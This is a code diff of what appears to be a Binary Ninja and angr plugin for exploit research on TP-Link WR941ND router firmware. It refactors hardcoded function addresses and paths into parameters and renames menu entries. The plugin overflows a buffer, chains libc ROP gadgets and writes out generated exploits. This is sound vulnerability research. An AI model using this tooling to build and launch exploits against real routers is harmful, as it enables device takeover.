@@ -105,14 +105,14 @@ class BackgroundTaskManager():
     @classmethod
     def vuln_explore(self, bv):
         self.init = cyclic(300).encode()
-        self.vulnerability_explorer = VulnerabilityExplorer(bv, self.init)
+        self.vulnerability_explorer = VulnerabilityExplorer(bv, self.init, 0x4703f0, 0x4706fc, ld_path='/home/horac/Research/firmware/WR941ND/fmk/rootfs/lib')
         self.runner = AngrRunner(bv, self.vulnerability_explorer)
         self.runner.start()
 
     @classmethod
     def build_rop(self, bv):
         self.proj = angr.Project(bv.file.filename, ld_path=[
-            '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
+            '/home/horac/Research/firmware/WR941ND/fmk/rootfs/lib'], use_system_libs=False)
         self.libc = self.proj.loader.shared_objects['libc.so.0']
         self.libc_base = self.libc.min_addr
         self.gadget1 = self.libc_base+0x00055c60
@@ -124,7 +124,7 @@ class BackgroundTaskManager():
 
         self.init = b"A"*160 + b"BBBB" + \
             p32(self.gadget2, endian='big')+p32(self.gadget1, endian='big')
-        self.rop_explorer = ROPExplorer(bv, self.init, self.proj, first=self.gadget1, second=self.gadget2,
+        self.rop_explorer = ROPExplorer(bv, self.init, self.proj, 0x4703f0, 0x4706fc, first=self.gadget1, second=self.gadget2,
                                         third=self.gadget3, fourth=self.gadget4, fifth=self.gadget5, sixth=self.sleep)
         self.runner = AngrRunner(bv, self.rop_explorer)
         self.runner.start()
@@ -147,23 +147,25 @@ class BackgroundTaskManager():
 
 
 class VulnerabilityExplorer(Explorer):
-    def __init__(self, bv, init_payload):
+    def __init__(self, bv, init_payload, func_start_addr, func_end_addr, ld_path=None, use_system_libs=False):
         self.bv = bv
+        self.func_start_addr = func_start_addr
+        self.func_end_addr = func_end_addr
         self.proj = angr.Project(self.bv.file.filename, ld_path=[
-            '/home/horac/Research/firmware/poc/fmk/rootfs/lib'], use_system_libs=False)
-        self.cfg = self.proj.analyses.CFGFast(regions=[(0x4703f0, 0x4706fc)])
+            ld_path ], use_system_libs=use_system_libs)
+        self.cfg = self.proj.analyses.CFGFast(regions=[(self.func_start_addr, self.func_end_addr)])
 
         self.init = init_payload
         self.arg0 = angr.PointerWrapper(self.init)
-        self.state = self.proj.factory.call_state(0x4703f0, self.arg0)
+        self.state = self.proj.factory.call_state(self.func_start_addr, self.arg0)
         self.simgr = self.proj.factory.simgr(self.state)
 
-        self.proj.hook(0x4706fc, self.explore)
-
+        self.proj.hook(self.func_end_addr, self.explore)
+    
     def explore(self, state):
         UIPlugin.color_path(self.bv, state.solver.eval(
             state.regs.pc, cast_to=int))
-        if state.solver.eval(state.regs.pc, cast_to=int) == 0x4706fc:
+        if state.solver.eval(state.regs.pc, cast_to=int) == self.func_end_addr:
             UIPlugin.dump_regs(state, registers)
             return True
 
@@ -217,11 +219,12 @@ class VulnerabilityExplorer(Explorer):
 
 
 class ROPExplorer(Explorer):
-    def __init__(self, bv, init_payload, project, **kwargs):
+    def __init__(self, bv, init_payload, project, func_start_addr, func_end_addr, **kwargs):
         self.bv = bv
-        self.end_addr = 0x4706fc
+        self.func_start_addr = func_start_addr
+        self.func_end_addr = func_end_addr
         self.proj = project
-        self.proj.analyses.CFGFast(regions=[(0x4703f0, self.end_addr)])
+        self.proj.analyses.CFGFast(regions=[(self.func_start_addr, self.func_end_addr)])
         self.init = init_payload
         self.gadget1 = kwargs['first']
         self.gadget2 = kwargs['second']
@@ -232,7 +235,7 @@ class ROPExplorer(Explorer):
         self.state_history = collections.OrderedDict()
         self.payload = collections.OrderedDict()
         self.arg0 = angr.PointerWrapper(self.init)
-        self.state = self.proj.factory.call_state(0x4703f0, self.arg0)
+        self.state = self.proj.factory.call_state(self.func_start_addr, self.arg0)
         self.simgr = self.proj.factory.simgr(self.state)
         binja.log_info("Gadget 1 address: 0x{0:0x}".format(self.gadget1))
         binja.log_info("Gadget 2 address: 0x{0:0x}".format(self.gadget2))
@@ -241,7 +244,7 @@ class ROPExplorer(Explorer):
         binja.log_info("Gadget 4 address: 0x{0:0x}".format(self.gadget4))
         binja.log_info("Gadget 5 address: 0x{0:0x}".format(self.gadget5))
 
-        self.proj.hook(self.end_addr, self.overwrite_ra)
+        self.proj.hook(self.func_end_addr, self.overwrite_ra)
         self.proj.hook(self.gadget1, self.hook_gadget1)
         self.proj.hook(self.gadget2, self.hook_gadget2)  # jalr $t9
         # lw $s1, 0x28($sp)
@@ -282,7 +285,7 @@ class ROPExplorer(Explorer):
     def overwrite_ra(self, state):
         pc = state.solver.eval(state.regs.pc, cast_to=int)
         UIPlugin.color_path(self.bv, pc)
-        if pc == self.end_addr:
+        if pc == self.func_end_addr:
             self.state_history['init'] = state
 
     def hook_gadget1(self, state):
@@ -382,7 +385,7 @@ class ROPExplorer(Explorer):
         # Generate raport for gadgets
 
             interaction.show_markdown_report("Initial State", self.get_rop_report(
-                self.state_history['init'], registers, self.end_addr))
+                self.state_history['init'], registers, self.func_end_addr))
             interaction.show_markdown_report("ROP Gadget 1", self.get_rop_report(
                 self.state_history[hex(self.gadget1)], registers, self.gadget1))
             interaction.show_markdown_report("ROP Gadget 2", self.get_rop_report(
@@ -463,12 +466,12 @@ class JSONExploitCreator(Explorer):
 
 
 PluginCommand.register(
-    "Angr\poc\Explore", "Attempt to solve for a path that satisfies the constraints given", BackgroundTaskManager.vuln_explore)
-PluginCommand.register("Angr\PoC\Build ROP",
+    "Angr\WR941ND\Explore", "Attempt to solve for a path that satisfies the constraints given", BackgroundTaskManager.vuln_explore)
+PluginCommand.register("Angr\WR941ND\Build ROP",
                        "Try to build exploit rop chain", BackgroundTaskManager.build_rop)
-PluginCommand.register("Angr\PoC\Generate Exploit\Save as JSON",
+PluginCommand.register("Angr\WR941ND\Generate Exploit\Save as JSON",
                        "Try to save exploit as JSON", BackgroundTaskManager.exploit_to_json)
-PluginCommand.register("Angr\PoC\Generate Exploit\Save to File",
+PluginCommand.register("Angr\WR941ND\Generate Exploit\Save to File",
                        "Try to build exploit fom rop chain", BackgroundTaskManager.exploit_to_file)
 PluginCommand.register(
-    "Angr\PoC\Clear", "Clear angr path traversed blocks", BackgroundTaskManager.stop)
+    "Angr\WR941ND\Clear", "Clear angr path traversed blocks", BackgroundTaskManager.stop)
